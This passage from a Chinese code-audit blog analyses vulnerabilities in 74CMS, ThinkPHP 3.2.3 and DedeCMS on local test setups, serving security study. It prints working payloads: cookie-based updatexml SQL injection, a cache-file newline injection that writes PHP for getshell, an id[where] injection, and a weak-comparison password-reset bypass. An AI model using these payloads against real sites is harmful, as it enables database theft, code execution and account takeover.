</code></pre><p>漏洞利用条件:</p>
<pre><code>a.IS_POST &amp;&amp; IS_AJAX
b.bind&apos; == $ucenter
c.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2
d.$data[&apos;unbind_mobile&apos;] 存在
</code></pre><p>这里的漏洞参数<code>$data[&#39;mobile&#39;]</code> 是可控的<br>虽然<code>$data[&#39;mobile&#39;]</code>是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对<code>cookie</code>接收的参数进行了合并,这样我们就可以利用<code>cookie</code>方式来传递我们的sql语句来进行注入</p>
<p>payload分析:</p>
<pre><code>url:http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
headers:Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest         //满足AJAX操作

Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
</code></pre><p><img src="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png" alt="image_1cp8u762a1mms1buc1l2bc851a4deg.png-93.2kB"></p>
<p>本地测试时,如无短信服务,我们可以注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png" alt="image_1cp8ufiq5u431rsd1p1a3j11sjjet.png-75.4kB"></p>
<p>4.<code>upload\Application\Home\Controller\membercontroller.class.php</code></p>
<pre><code>public function oauth_reg(){

        if (cookie(&apos;members_bind_info&apos;)) {

            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));

        }else{
            $this-&gt;error(&apos;第三方授权失败，请重新操作！&apos;);
        }
        //第三方帐号绑定
        $username = I(&apos;post.username&apos;,&apos;&apos;,&apos;trim&apos;);
        $password = I(&apos;post.password&apos;,&apos;&apos;,&apos;trim&apos;);
        $passport = $this-&gt;_user_server();
        ...
    }

        else{//进入
            $user = $passport-&gt;_user;//获取个人信息
            ...//uid不可控 所以这里不可利用
        }
        ...
        $info = M(&apos;MembersBind&apos;)-&gt;where(array(&apos;type&apos;=&gt;$user_bind_info[&apos;type&apos;],&apos;uid&apos;=&gt;$uid))-&gt;find();//触发点
</code></pre><p>payload:</p>
<pre><code>header：Content-Type: application/x-www-form-urlencoded
       //表明提交的表单数据编码为键值对,用&amp;分隔

Cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a

POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
</code></pre><p>这里的<code>$user_bind_info</code>是用<code>cookie</code>方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/02/74CMS缓存设计缺陷导致getshell/" itemprop="url">代码审计 | 74CMS缓存设计缺陷导致getshell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-02T10:15:41+08:00">
                2018-10-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。</p>
</blockquote>
<hr>
<p>审计cms：<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:用了<code>Thinkphp3.2.3</code>改写的缓存函数<code>set()</code>方法,而这个方法对写入的内容只进行了<code>serialize()</code>函数过滤操作,导致可用<code>%0D%0A</code>进行换行写入<code>php</code>代码而<code>getshell</code></p>
<p>##<strong>1.基础知识:</strong><br><code>Thinkphp</code>的一些基本操作可参考文章:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
<p>##<strong>2.环境搭建:</strong><br>创建一个企业用户用于验证漏洞即可</p>
<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
<pre><code>url:http://127.0.0.1:84/index.php?m=&amp;c=Company&amp;a=com_auth
POST:anew=1&amp;certificate_img_up=%2F%2F%0D%0Aphpinfo();//
</code></pre><p><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
<p>##<strong>4.代码分析:</strong><br>相关变量已写入注释中：</p>
<pre><code>#home\controller\companyController.class.php
public function com_auth(){
    ...
    if(IS_POST &amp;&amp; $this-&gt;company_profile[&apos;audit&apos;]!=1){
        $data[&apos;certificate_img&apos;] = I(&apos;post.certificate_img_up&apos;,&apos;&apos;,&apos;trim,badword&apos;);
        $data[&apos;audit&apos;] = 2;
    ...
    if($this-&gt;company_profile[&apos;audit&apos;] == 0 || ($this-&gt;company_profile[&apos;audit&apos;] != 1 &amp;&amp; I(&apos;request.anew&apos;,0,&apos;intval&apos;) == 1)){
        S(&apos;certificate_img_&apos; . $this-&gt;company_profile[&apos;uid&apos;],$this-&gt;company_profile[&apos;certificate_img&apos;]);
    }
    ...
}
</code></pre><p>这里在造成漏洞的原理是底层的tp框架的锅, 笔者前几天写过分析文章:<br><a href="https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/</a><br>我们这里再照常分析一遍代码流程:<br>跟进<code>TP</code>框架自带的<code>S()</code>缓存方法:<br><img src="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png" alt="image_1coqjmno01prl1qtah9718cn4im9.png-100.5kB"></p>
<p>跟进<code>set()</code>方法:</p>
<pre><code>Librayr\Think\Cache\Driver\File.class.php 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png" alt="image_1coqk0d8k19e511civine11hngm.png-95.1kB"></p>
<p>跟进<code>filename()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png" alt="image_1coqk5e7ro91oa92l11l991k4913.png-69.4kB"></p>
<p><code>uid</code>为2得到的缓存文件名:<br><img src="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png" alt="image_1coqknv8vc5c6kf146l1hq11khj1g.png-29.8kB"></p>
<p>因为这里的<code>$filename</code>与<code>$name</code>相关联,而<code>$name</code>与<code>$uid</code>相关联<br>就是说我们可以根据用户的<code>uid</code>来得到缓存文件名 进而可<code>getshell</code><br><img src="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png" alt="image_1coql21hfvtdeae5l418hs9021t.png-151.8kB"><br><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
<p><code>uid</code>可在个人主页看到:<br><img src="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png" alt="image_1coqmpc8hsc515brgk313ra1ben2n.png-86.2kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/" itemprop="url">代码审计 | Thinkphp3.2 find_delete_selete注入分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-29T09:15:41+08:00">
                2018-09-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>##<strong>基础知识:</strong><br><img src="http://static.zybuluo.com/chhyx/lw29luk5t7su3s5qqqriv3fn/image_1coi47sfp1u5q6iruc7rtffoe6k.png" alt="image_1coi47sfp1u5q6iruc7rtffoe6k.png-74kB"><br>更多基础知识看:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
<p>##<strong>环境搭建:</strong><br>cms:<a href="http://static.zybuluo.com/chhyx/ekxqnkhns953gzus9dk1qsig/image_1coju9t0q1b3dmm3109puv41ds49.png" target="_blank" rel="noopener">Thinkphp3.2.3</a><br>下载后开启debug调试模式,方便测试。</p>
<pre><code>#Application\Home\Controller\IndexController.class.php:
&lt;?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $Model = M(&apos;user&apos;);
        $Model-&gt;find(I(&apos;get.id&apos;));
        //$Model-&gt;select(I(&apos;get.id&apos;));
        //$Model-&gt;delete(I(&apos;get.id&apos;));
    }
}
?&gt;
</code></pre><p><code>select</code>、<code>delete</code>与<code>find</code>代码分析流程基本一样 这里就不再赘述 因为方法中都调用了有问题的<code>_parseOptions()</code>方法</p>
<p>##<strong>漏洞利用：</strong><br>payload:</p>
<pre><code>http://127.0.0.1:85/index.php/home/index/index?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vmaxbtyn92txy3ccoburcfmp/image_1coi3s5gvspqtpo1s1g1euq15e067.png" alt="image_1coi3s5gvspqtpo1s1g1euq15e067.png-81kB"></p>
<p>##<strong>代码分析:</strong><br>相关变量已加到注释中<br>A.从<code>IndexController.class.php</code>开始分析</p>
<pre><code>$Model-&gt;find(I(&apos;get.id&apos;));
</code></pre><p>B.跟进<code>Thinkphp\Library\Think\Model.class.php</code>的<code>find()</code>方法:</p>
<pre><code>#Thinkphp\Library\Think\Model.class.php 722行
public function find($options=array()) {
...
// 总是查找一条记录
$options[&apos;limit&apos;]   =   1;

    // 分析表达式
    $options            =   $this-&gt;_parseOptions($options);
    //方法的核心 分析表达式 获取表名 获取字段

    // 判断查询缓存
    //无缓存
...

    $resultSet          =   $this-&gt;db-&gt;select($options);//在这里报错
</code></pre><p>进入_parseOptions()方法:</p>
<pre><code>protected function _parseOptions($options=array()) {
if(is_array($options))
    $options =  array_merge($this-&gt;options,$options);
...
// 表达式过滤
$this-&gt;_options_filter($options);
return $options;
}
</code></pre><p>进入<code>_parseOptions()</code>方法后,判断如果<code>$options</code>为数组 则直接拼接 下面的<code>_options_filter()</code>是个空方法 并无过滤<br>我们继续分析：</p>
<pre><code>$resultSet       =   $this-&gt;db-&gt;select($options);
</code></pre><p>C.跟进<code>Thinkphp\Library\Think\Db\Driver.class.php</code>文件的<code>select()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/tdbbat7954ktp3f227xv32sr/image_1coi0lkg517g1ghqv331n9fj6o9.png" alt="image_1coi0lkg517g1ghqv331n9fj6o9.png-48.9kB"></p>
<p>跟进生成<code>buildSelectSql()</code>方法:</p>
<pre><code>public function buildSelectSql($options=array()) {
...
$sql  =   $this-&gt;parseSql($this-&gt;selectSql,$options);
return $sql;
}
</code></pre><p>跟进<code>parseSql()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/w5s7d3huryk02oimj6hn2cu6/image_1coi0q3fk1hh0jkiatc1oc515sm1m.png" alt="image_1coi0q3fk1hh0jkiatc1oc515sm1m.png-75.9kB"></p>
<p>跟进<code>parseWhere()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/ekxqnkhns953gzus9dk1qsig/image_1coju9t0q1b3dmm3109puv41ds49.png" alt="image_1coju9t0q1b3dmm3109puv41ds49.png-19.3kB"></p>
<p>传入的<code>$options[&#39;where&#39;]</code>的值为<code>string</code>类型时直接返回</p>
<p>D.在<code>parseSql()</code>方法中 我们可以看到不仅仅<code>$where</code>我们可控 像其他的<code>table field order union</code>等 我们都是可以控制的:<br><img src="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png" alt="image_1coi1gccr10g61jcvfk5stn6i35q.png-47.9kB"></p>
<p>也就是说我们可以自己构造sql语句进行注入。</p>
<p>E.经过分析,我们可得到造成漏洞的原因是<code>_parseOptions()</code>方法中直接拼接字符串导致的 我们搜一下这个方法的所有利用点:</p>
<pre><code>_parseOptions($options)
</code></pre><p>搜了下整个框架,引入这个<code>_parseOptions()</code>的方法情况:<br>第一个参数可控时,可注入:</p>
<pre><code>public function find($options=array())
public function select($options=array())
public function delete($options=array())
</code></pre><p>第二个参数可控时,可注入:</p>
<pre><code>public function save($data=&apos;&apos;,$options=array())
public function add($data=&apos;&apos;,$options=array(),$replace=false)
public function addAll($dataList,$options=array(),$replace=false)
</code></pre><p>//不将<code>$options</code>带入sql语句中,无法注入:</p>
<pre><code>public function selectAdd($fields=&apos;&apos;,$table=&apos;&apos;,$options=array())
</code></pre><p>一共可利用的点有6处。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/28/TP框架数据操作/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/28/TP框架数据操作/" itemprop="url">基础知识 | TP框架数据操作</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-28T08:15:41+08:00">
                2018-09-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>计划把TP框架的基础部分看一看以帮助审计,就先以3.2.x的手册练习,持续更新……</p>
</blockquote>
<hr>
<p>连贯操作:</p>
<pre><code> public function testsql(){
    $User = M(&quot;User&quot;); // 实例化User对象

    $result = $Model-&gt;select();
    //SELECT * FROM `user`

    //1.where：完成多种查询操作
    //字符串查询
    $User-&gt;where(&apos;type=1 AND status=1&apos;)-&gt;select();
    //执行的sql语句为:select * from User where type=1 and status=1;

    //数组查询
    $map[&apos;id&apos;] = 1;
    $map[&apos;name&apos;] = &apos;test&apos;;
    $user-&gt;where($map)-&gt;select();
    //sql语句:select * from where id=1 and &apos;name&apos; = &apos;test&apos;;

    //表达式查询   sql注入出现多的地方
    $map[&apos;name&apos;] = array(&apos;eq&apos;,&quot;1&quot;);//其他表达式:GT EGT LT ELT LIKE BETWEEN IN EXP
    $user-&gt;where($map)-&gt;select();
    echo M(&apos;user&apos;)-&gt;_SQL();//SELECT * FROM `user` WHERE `name` = &apos;1&apos;


    //2.table：主要用于指定操作的数据表
    $Model-&gt;table(&apos;gather&apos;)-&gt;where(&apos;id=1&apos;)-&gt;select();
    //SELECT * FROM `gather` WHERE ( id=1 ) 由user表暂时切换到gather表


    //3.order:用于对操作的结果排序
    $Model-&gt;order(&apos;id desc&apos;)-&gt;limit(5)-&gt;select();
    //SELECT * FROM `user` ORDER BY id desc LIMIT 5
    $Model-&gt;order(&apos;name desc,id&apos;)-&gt;limit(5)-&gt;select();
    //支持多个字段排序 如果没有指定desc或者asc排序规则的话，默认为asc。


    //4.field 标识要返回或者操作的字段，可以用于查询和写入操作
    //查询：
    $result = $Model-&gt;field(&apos;id,name&apos;)-&gt;select();
    //SELECT `id`,`name` FROM `user

    $result = $Model-&gt;field(&apos;id,SUM(id)&apos;)-&gt;select();
    //可执行函数 user() database()等

    $Model-&gt;field(&apos;pwd&apos;,true)-&gt;select();
    //排除pwd这个字段  sql:SELECT `Id`,`name` FROM `user`

    //写入：
    $Model-&gt;field(&apos;id,name,pwd&apos;)-&gt;create();
    //也可以字段合法性检测 合法字段只有id name pwd这三种


    //5.union 联合查询 必须保证字段数量一样  每个union方法相当于一个独立的SELECT语句
    $Model-&gt;field(&apos;id&apos;)-&gt;table(&apos;gather&apos;)-&gt;union(array(&apos;field&apos; =&gt; &apos;pwd&apos;,&apos;table&apos; =&gt; &apos;user&apos;))-&gt;union(array(&apos;field&apos;=&gt;&apos;goods_name&apos;,&apos;table&apos;=&gt;&apos;goods&apos;))-&gt;select();



    //6.cache  
    $result = $Model-&gt;cache(&apos;key&apos;,60)-&gt;find();
    //find返回一条数据 缓存有效期为60s
}
</code></pre><p>CURD操作:</p>
<pre><code>public function test_CURD(){
    $Model = M(&apos;user&apos;);
//CURD操作
//1.数据创建 只是保存在内存中 只有用add或save才会写入数据库中
$data[&apos;name&apos;] = &apos;p0rz9&apos;;
    $data[&apos;pwd&apos;] = &apos;123456&apos;;
$Model-&gt;create($data);
var_dump($Model-&gt;name);//直接读取数据
    $Model-&gt;name = &apos;P0rz9&apos;;//直接修改数据


    //2.数据写入 
    $Model-&gt;add();
    //sql:INSERT INTO `user` (`name`,`pwd`) VALUES (&apos;P0rz9&apos;,&apos;123456&apos;) 

    //字段过滤 写入时可用field过滤非法字段
    $Model-&gt;field(&apos;name&apos;)-&gt;data($data)-&gt;add();
    //最终只有name字段的数据写入 pwd字段被过滤

    //字段内容过滤 filter方法对其内容过滤 strip_tags为过滤函数
    $Model-&gt;data($data)-&gt;filter(&apos;strip_tags&apos;)-&gt;add();

    //3.数据读取
    $result = $Model-&gt;where(&apos;id=1&apos;)-&gt;find();//返回一行数据(或关联数据)
    var_dump($result);//也可用data()获取查询后的数据:var_dump($Model-&gt;data());



    //4.更新数据
    $data[&apos;name&apos;] = &apos;kkk&apos;;
    $Model-&gt;where(&apos;Id=1&apos;)-&gt;save($data);//数据对象属性操作
    $Model-&gt;name = &apos;ThinkPHP&apos;;
    $Model-&gt;where(&apos;id=1&apos;)-&gt;save();//对象方式操作


    //5.删除数据
    $Model-&gt;where(&apos;Id=5&apos;)-&gt;delete(); // 删除id为5的用户数据
    $Model-&gt;delete(&apos;1,2,5&apos;); // 删除主键为1,2和5的用户数据
    $Model-&gt;where(&apos;status=0&apos;)-&gt;delete(); // 删除所有状态为0的用户数据
    $Model-&gt;where(&apos;status=0&apos;)-&gt;order(&apos;create_time&apos;)-&gt;limit(&apos;5&apos;)-&gt;delete(); 
    //删除所有状态为0的5个用户数据 按照创建时间排序
</code></pre><p>}</p>
<p>TP自带的核心函数:</p>
<pre><code>public function Test_Think_Func(){

    $User = D(&apos;User&apos;);// 相当于 $User = new \Home\Model\UserModel();
    $User-&gt;select(); //执行具体的数据操作

    $User = M(&apos;User&apos;);// 和用法 $User = new \Think\Model(&apos;User&apos;);等效
    $User-&gt;select();

}
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/27/代码审计Day4 - strpos使用不当引发漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/27/代码审计Day4 - strpos使用不当引发漏洞/" itemprop="url">代码审计Day4 - strpos使用不当引发漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-27T23:15:41+08:00">
                2018-09-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>##<strong>Day 4 - False Beard</strong></p>
<p>###题目名字:假胡子<br>代码如下:<br><img src="http://static.zybuluo.com/chhyx/k6us42u3h1vo6gsj8fmn93ov/image_1coc8vpb31o8a1e2513vsfr71licm.png" alt="image_1coc8vpb31o8a1e2513vsfr71licm.png-162.2kB"></p>
<p>##<strong>代码大意:</strong><br>题目定义了一个登陆类,在7-10行对传入的参数<code>$user</code>与<code>$pass</code>进行了判断,但是这里的判断是有问题的,这也是本次产生漏洞的地方,11-12行进行了格式化字符串 使用xml结构存储登陆数据,并在16行调用了登陆类进行登陆操作</p>
<p>##<strong>漏洞产生</strong><br>A.我们先来看下<code>strpos()</code>函数</p>
<pre><code>PHP strpos() 函数
作用:strpos() 函数查找字符串在另一字符串中第一次出现的位置。。
定义:strpos(string,find,start)
</code></pre><p><img src="http://static.zybuluo.com/chhyx/hxi1hw3eyjqzrimfe55ya959/image_1coc8uslu1o8l1k3e9stsps1tld9.png" alt="image_1coc8uslu1o8l1k3e9stsps1tld9.png-24.3kB"><br>我们可看到上面的例子中 如果我们要找的字符在目标字符串的开头 则会返回0,若不存在返回false,那么在回到这道题目 开发者只考虑返回false的情况,却忽略了匹配的字符在开头的情况 0与false取反都为true,这样我们就可以在用户和密码首字符注入&lt;符号 从而注入xml数据。</p>
<p>B.我们测试下我们的<code>payload</code>:</p>
<pre><code>$user=&lt;&quot;&gt;&lt;injected-tag property=&quot;&amp;$pass=&apos;&lt;injected-tag&gt;&apos;
</code></pre><p>测试例子：<br><img src="http://static.zybuluo.com/chhyx/srccuqejrb04txpxjpk84u19/image_1coc9hf541mltd0vofedkq1ssa13.png" alt="image_1coc9hf541mltd0vofedkq1ssa13.png-53.4kB"></p>
<p>说明可以注入xml数据</p>
<p>##<strong>实例cms分析:</strong><br>这里选择<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">DedeCMS-V5.7-UTF8-SP2</a>的一处任意用户密码重置漏洞,由于对接收的参数<code>$safequestion</code>没有进行严格的类型判断,导致可以使用弱类型比较绕过<br><strong>1.环境搭建:</strong><br>下载后将uploads目录放在网站根目录安装即可<br><strong>2.漏洞利用:</strong><br>A.首先登陆后台开启会员功能<br><img src="http://static.zybuluo.com/chhyx/r75qe4s49rk9lqrhsnr1hvtq/image_1cocjrlme1ckv1fe3kqsbdtr1520.png" alt="image_1cocjrlme1ckv1fe3kqsbdtr1520.png-89.3kB"></p>
<p>B.注册2个会员且不设置安全密保问题(这是重置的关键)</p>
<p>C.用户test1的id为8   test2的id为9<br><img src="http://static.zybuluo.com/chhyx/msxov9pukodl2uhhztovscla/image_1cock5fj91to8189mj9a1k35118e2t.png" alt="image_1cock5fj91to8189mj9a1k35118e2t.png-14.8kB"></p>
<p>D.在登陆账号test1的情况下访问链接:</p>
<pre><code>http://127.0.0.1:84/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=9
</code></pre><p>抓包,放到Repeater重放,得到test2的key:<br><img src="http://static.zybuluo.com/chhyx/oi0pbvojzfjopddkgllcrk8n/image_1cockdrl1efg122ma733rq3dc67.png" alt="image_1cockdrl1efg122ma733rq3dc67.png-114kB"></p>
<p>E.然后带着id与key访问:</p>
<pre><code>http://127.0.0.1:84/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=3uZAQ9Z
</code></pre><p><img src="http://static.zybuluo.com/chhyx/255tksowj8eeajh98p91k8kz/image_1cockk8c4hjc1lht5g310hq7b86k.png" alt="image_1cockk8c4hjc1lht5g310hq7b86k.png-56.3kB"></p>
<p>填写密码即可更改用户test2的密码</p>
<p><strong>3.代码分析:</strong><br>相关<code>变量</code>已添加到注释中:<br>A.根据漏洞url定位到<code>member\resetpassword.php</code>的<code>safequestion</code>操作:</p>
<pre><code>else if($dopost == &quot;safequestion&quot;)
{
    $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id);
    $sql = &quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &apos;$mid&apos;&quot;;
    $row = $db-&gt;GetOne($sql);
    if(empty($safequestion)) $safequestion = &apos;&apos;;
    if(empty($safeanswer)) $safeanswer = &apos;&apos;;
    //$row[&apos;safequestion&apos;]:&quot;0&quot;  $row[&apos;safeanswer&apos;]:&apos;&apos;
    if($row[&apos;safequestion&apos;] == $safequestion &amp;&amp; $row[&apos;safeanswer&apos;] == $safeanswer)
    {
        sn($mid, $row[&apos;userid&apos;], $row[&apos;email&apos;], &apos;N&apos;);
        exit();
    }
    else
    {
        ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;,&quot;-1&quot;);
        exit();
    }

}
</code></pre><p>这里先根据传入的<code>id</code>参数查询对应用户的<code>密保问题答案</code> <code>userid</code> <code>邮箱</code>等信息,接着下面进行判断,如果传入的<code>$safequestion</code>与<code>$safeanswer</code>非空且与之前设置的相等,就进入<code>sn()</code>函数操作 它这里用的是 <code>==</code> 而非 <code>===</code> 来判断,所以这里是可以绕过的<br>我们看个小例子:<br><img src="http://static.zybuluo.com/chhyx/915su480ub47uwuzinoj4g1b/image_1coclnmmb6tonv9ehb8ab1o1q7e.png" alt="image_1coclnmmb6tonv9ehb8ab1o1q7e.png-27.7kB"></p>
<p>B.那么这里我们就可以用<code>safequestion=0.0&amp;safeanswer=</code>即可使<code>$row[&#39;safequestion&#39;] == $safequestion &amp;&amp; $row[&#39;safeanswer&#39;] == $safeanswer)</code><br>为true,进入<code>sn()</code>函数:</p>
<pre><code>#uploads\member\inc\inc_pwd_function.php 150行
function sn($mid,$userid,$mailto, $send = &apos;Y&apos;)
{
    global $db;
    $tptim= (60*10);
    $dtime = time();
    $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &apos;$mid&apos;&quot;;
    $row = $db-&gt;GetOne($sql);
    if(!is_array($row))
    {
        //发送新邮件；
        newmail($mid,$userid,$mailto,&apos;INSERT&apos;,$send);
    }
    //10分钟后可以再次发送新验证码；
    elseif($dtime - $tptim &gt; $row[&apos;mailtime&apos;])
    {
        newmail($mid,$userid,$mailto,&apos;UPDATE&apos;,$send);
    }
    //重新发送新的验证码确认邮件；
    else
    {
